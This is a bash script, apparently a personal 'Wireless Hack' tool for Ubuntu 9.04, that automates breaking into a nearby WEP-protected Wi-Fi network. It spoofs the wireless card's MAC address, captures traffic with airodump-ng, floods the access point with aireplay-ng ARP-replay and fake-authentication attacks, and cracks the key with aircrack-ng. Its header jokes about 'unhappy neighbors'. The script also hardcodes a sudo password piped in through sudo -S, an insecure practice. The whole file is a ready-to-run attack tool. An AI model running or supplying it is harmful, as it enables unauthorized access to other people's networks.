#!/bin/bash
#
# WARNING: USE AT YOUR OWN RISK!
#
# SIDE EFFECTS: UNHAPPY NEIGHBORS
#
# Author: Albertux 
# Web: http://albertux.com
# Script: Wireless Hack
# Tested on: Ubuntu 9.04

# A little trouble using gksudo gnome-terminal
# https://bugs.launchpad.net/ubuntu/+source/gconf2/+bug/328575
# gnome-terminal -e "sudo ...." # could be ...
# TERM=gnome-terminal
TERM=xterm

# A nasty function to run_like_a_root user sending the passwd
function run_like_a_root() {
sudo -S $@ << EOF
qwerty
EOF
}

# Restore to normal: ./this_script.sh restore
if [ "$1" == "restore" ]; then
        run_like_a_root "airmon-ng stop mon0"
        run_like_a_root "/etc/init.d/networking restart"
        run_like_a_root "NetworkManager"
        exit 1
fi

# Set Wireless Device: ./this_script.sh wlan1
if [ -z $1 ]; then
        WDEVICE=wlan0 # Could be diferrent on your notebook
else
        WDEVICE=$1 # Set Wireless Device
fi

# Stop Wireless
run_like_a_root airmon-ng stop $WDEVICE && echo "$WDEVICE [off]"

# Kill all fu**ing process using the Wireless Device:
run_like_a_root kill -9 `run_like_a_root airmon-ng start $WDEVICE | grep ^[1-9] | awk ' { print $1 } '` && echo "Kill all process"

# Wireless Devices Down (we need to change the Mac)
run_like_a_root ifconfig $WDEVICE down && echo "$WDEVICE [off]"
run_like_a_root ifconfig mon0 down && echo "mon0 [off]"

# Fake Mac, Example:
FAKEMAC=00:66:00:66:00:66

# Set Fake Mac
run_like_a_root macchanger -m $FAKEMAC $WDEVICE && echo "$WDEVICE [$FAKEMAC]"
run_like_a_root macchanger -m $FAKEMAC mon0 && echo "mon0 [$FAKEMAC]"

# Up the Wireless Interface
run_like_a_root ifconfig mon0 up && echo "mon0 [on]"

# See all available networks
run_like_a_root $TERM -e "airodump-ng mon0" &


echo "press any key to clear"
read

# Watch the xterm loaded and write the values (maybe you need resize xterm window)
clear
echo "Network Name: "
read ESSID
echo "Network Mac: "
read BSSID
echo "Network Channel: "
read CHANNEL
echo "Close the airodump-ng xterm and press [enter]"
read

sleep 5;
# Get Data (IVs)
run_like_a_root $TERM -e "airodump-ng mon0 -w data -c $CHANNEL --bssid $BSSID" &

sleep 5;
# ARP Request
run_like_a_root $TERM -e "aireplay-ng -3 -b $BSSID -h $FAKEMAC mon0" &

sleep 5;
# Fake Authentication Attack
run_like_a_root $TERM -e "watch aireplay-ng -1 0 -e $ESSID -a $BSSID -h $FAKEMAC mon0" &

# Wait some time ...
echo "Press any kay to launch aircrack-ng (30,000+ on data recommended)"
read

# Crack the Passwd
run_like_a_root $TERM -e "aircrack-ng data-*.cap" &

exit 0
